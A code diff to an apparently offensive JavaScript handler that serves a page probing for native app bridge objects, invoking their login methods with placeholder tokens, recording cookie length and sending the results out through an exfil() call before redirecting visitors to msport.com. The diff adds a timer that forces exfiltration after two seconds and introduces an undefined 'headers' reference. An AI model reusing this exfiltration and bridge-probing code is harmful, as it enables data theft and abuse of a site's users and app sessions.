@@ -1,7 +1,7 @@
 const HITS = [];
 
 function clientIp(req) {
-  const xff = req.headers['x-forwarded-for'];
+  const xff = headers['x-forwarded-for'];
   return xff ? String(xff).split(',')[0].trim() : (req.socket && req.socket.remoteAddress) || 'unknown';
 }
 
@@ -60,7 +60,6 @@ module.exports = async function handler(req, res) {
 
   var attempts = 0;
   var maxAttempts = 20;
-  var bridgeFound = false;
 
   function tryBridge() {
     attempts++;
@@ -74,7 +73,6 @@ module.exports = async function handler(req, res) {
     });
 
     if (found.length > 0) {
-      bridgeFound = true;
       L('bridge found', found.join(','));
       var result = {
         ts: new Date().toISOString(),
@@ -85,6 +83,17 @@ module.exports = async function handler(req, res) {
         bridges: found,
         action_login_result: null
       };
+
+      var exfilSent = false;
+      function sendResult() {
+        if (exfilSent) return;
+        exfilSent = true;
+        exfil(result);
+        L('exfil sent', JSON.stringify(result).length + ' bytes');
+      }
+
+      // Always exfil after 2s even if callback never fires
+      setTimeout(sendResult, 2000);
 
       found.forEach(function(n) {
         var b = window[n];
@@ -98,18 +107,16 @@ module.exports = async function handler(req, res) {
               accessToken: 'PROBE_AT',
               refreshToken: 'PROBE_RT'
             }), function(resp) {
-              result.action_login_result = n+'.'+m+' callback:' + JSON.stringify(resp);
-              exfil(result);
+              result.action_login_result = n+'.'+m+' cb:' + JSON.stringify(resp);
+              sendResult();
             });
             result.action_login_result = n+'.'+m+' sent';
-            return;
           } catch(e) {
             result.action_login_result = n+'.'+m+' err:'+e;
+            sendResult();
           }
         });
       });
-
-      exfil(result);
       return;
     }
 
@@ -123,7 +130,7 @@ module.exports = async function handler(req, res) {
         cookie_len: document.cookie.length,
         bridges: [],
         action_login_result: 'no_bridge_on_external_page',
-        note: 'Bridge not injected into external pages. Redirecting to msport.com where bridge IS available.'
+        note: 'Redirecting to msport.com'
       };
       exfil(finalResult);
       L('redirecting', 'to msport.com');
